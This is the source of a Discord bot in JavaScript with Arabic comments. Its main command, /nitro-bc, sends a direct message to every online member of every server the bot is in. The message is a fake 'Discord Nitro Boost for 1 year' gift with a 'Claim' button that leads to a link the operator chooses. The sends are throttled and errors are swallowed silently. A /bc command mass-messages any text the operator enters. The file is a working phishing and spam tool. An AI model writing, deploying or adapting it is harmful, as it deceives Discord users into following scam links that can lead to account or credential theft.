require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ButtonBuilder,
  ButtonStyle,
  ActionRowBuilder,
  Collection
} = require('discord.js');

// إعداد العميل
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildPresences
  ]
});

// معلومات
const authorizedIDs = ['1209548876877402163']; // ضع هنا ID حسابك المصرح له
const mainServerId = '1386543197018132560';   // ضع هنا ID السيرفر الأساسي
const clientId = process.env.CLIENT_ID;        // من environment variables
const token = process.env.TOKEN;               // من environment variables

let sending = false;
let speed = 10 * 1000;
let sentCount = 0;

// إنشاء أوامر السلاش
const commands = [
  new SlashCommandBuilder().setName('help').setDescription('📜 عرض قائمة المساعدة.'),
  new SlashCommandBuilder().setName('status').setDescription('🚀 عرض حالة التقدم وعدد من تم الإرسال لهم.'),
  new SlashCommandBuilder().setName('servers').setDescription('📜 عرض السيرفرات التي يوجد بها البوت.'),
  new SlashCommandBuilder().setName('stop').setDescription('🛑 إيقاف الإرسال الحالي.'),
  new SlashCommandBuilder()
    .setName('setspeed')
    .setDescription('⚙️ تغيير سرعة الإرسال بالثواني.')
    .addIntegerOption(opt => opt.setName('seconds').setDescription('عدد الثواني').setRequired(true)),
  new SlashCommandBuilder()
    .setName('nitro-bc')
    .setDescription('🎁 إرسال نيترو لكل الأعضاء الأونلاين.')
    .addStringOption(opt => opt.setName('link').setDescription('رابط النيترو').setRequired(true)),
  new SlashCommandBuilder()
    .setName('bc')
    .setDescription('✉️ إرسال رسالة للأعضاء الأونلاين في السيرفر.')
    .addStringOption(opt => opt.setName('message').setDescription('نص الرسالة').setRequired(true)),
];

// تسجيل الأوامر عند التشغيل
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);

  try {
    const rest = new REST({ version: '10' }).setToken(token);
    await rest.put(Routes.applicationCommands(clientId), { body: commands.map(c => c.toJSON()) });
    console.log('✅ تم تسجيل أوامر السلاش بنجاح!');
  } catch (err) {
    console.error('❌ خطأ أثناء تسجيل الأوامر:', err);
  }
});

// دالة انتظار
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// التفاعل مع الأوامر
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (!authorizedIDs.includes(interaction.user.id)) {
    return interaction.reply({ content: '❌ ما عندك صلاحية تستخدم هذا الأمر.', ephemeral: true });
  }

  const { commandName } = interaction;

  if (commandName === 'help') {
    return interaction.reply({
      content: `📜 **أوامر البوت:**\n\n` +
        `1️⃣ /status - عرض حالة التقدم وعدد من تم الإرسال لهم\n` +
        `2️⃣ /servers - عرض السيرفرات التي يوجد بها البوت\n` +
        `3️⃣ /stop - إيقاف الإرسال الحالي\n` +
        `4️⃣ /setspeed <ثواني> - ضبط سرعة الإرسال\n` +
        `5️⃣ /nitro-bc <link> - إرسال نيترو لكل الأعضاء الأونلاين\n` +
        `6️⃣ /bc <message> - إرسال رسالة مخصصة للأعضاء الأونلاين في السيرفر الأساسي\n`,
      ephemeral: true
    });
  }

  else if (commandName === 'status') {
    return interaction.reply({
      content: `🚀 الحالة: ${sending ? `الإرسال جاري وتم الإرسال إلى **${sentCount}** عضو.` : `لا يوجد إرسال حالي. تم الإرسال إلى **${sentCount}** عضو.`}`,
      ephemeral: true
    });
  }

  else if (commandName === 'servers') {
    const guilds = client.guilds.cache.map((g, i) => `${i + 1}. ${g.name}`).join('\n');
    return interaction.reply({ content: `📜 السيرفرات:\n${guilds}`, ephemeral: true });
  }

  else if (commandName === 'stop') {
    sending = false;
    return interaction.reply('🛑 تم إيقاف الإرسال الحالي.');
  }

  else if (commandName === 'setspeed') {
    const sec = interaction.options.getInteger('seconds');
    speed = sec * 1000;
    return interaction.reply(`⚙️ تم تعيين سرعة الإرسال إلى **${sec} ثانية**.`);
  }

  else if (commandName === 'nitro-bc') {
    const link = interaction.options.getString('link');
    await interaction.reply('🚀 بدأ إرسال رسالة نيترو لكل الأعضاء الأونلاين...');
    sending = true;
    sentCount = 0;
    const sentUsers = new Set();

    for (const [id, guild] of client.guilds.cache) {
      if (!sending) break;
      try {
        const members = await guild.members.fetch({ withPresences: true });
        for (const member of members.values()) {
          if (!sending) break;
          const status = member.presence?.status;
          if (!member.user.bot && ['online', 'idle', 'dnd'].includes(status) && !sentUsers.has(member.user.id)) {
            try {
              const embed = new EmbedBuilder()
                .setColor(0x5865F2)
                .setDescription(`Hello ${member.toString()},\nYou’ve been gifted a **Discord Nitro Boost for 1 year!**\nClick below to claim your Nitro!`)
                .setImage('https://cdn.discordapp.com/attachments/1344770064703946802/1362981864305987594/271-A2-D28-057-B-4-B8-F-ADDE-A547-CC3-E36-B8.jpg')
                .setFooter({ text: 'Gift sent now!' });

              const button = new ButtonBuilder()
                .setLabel('Claim')
                .setStyle(ButtonStyle.Link)
                .setURL(link)
                .setEmoji('🎁');

              const row = new ActionRowBuilder().addComponents(button);

              await member.send({ embeds: [embed], components: [row] });
              sentUsers.add(member.user.id);
              sentCount++;
              console.log(`📤 أُرسل إلى: ${member.user.tag}`);
              await sleep(speed);
            } catch {}
          }
        }
      } catch {}
    }
  }

  else if (commandName === 'bc') {
    const msg = interaction.options.getString('message');
    const guild = client.guilds.cache.get(mainServerId);
    if (!guild) return interaction.reply('❌ السيرفر الأساسي غير موجود.');

    await interaction.reply('🚀 جاري إرسال رسالتك لكل الأعضاء الأونلاين في السيرفر...');
    const members = await guild.members.fetch({ withPresences: true });

    for (const member of members.values()) {
      const status = member.presence?.status;
      if (!member.user.bot && ['online', 'idle', 'dnd'].includes(status)) {
        member.send(`${msg}\n${member.toString()}`).catch(() => {});
        sentCount++;
        await sleep(speed);
      }
    }
  }
});

// تسجيل الدخول
client.login(token);
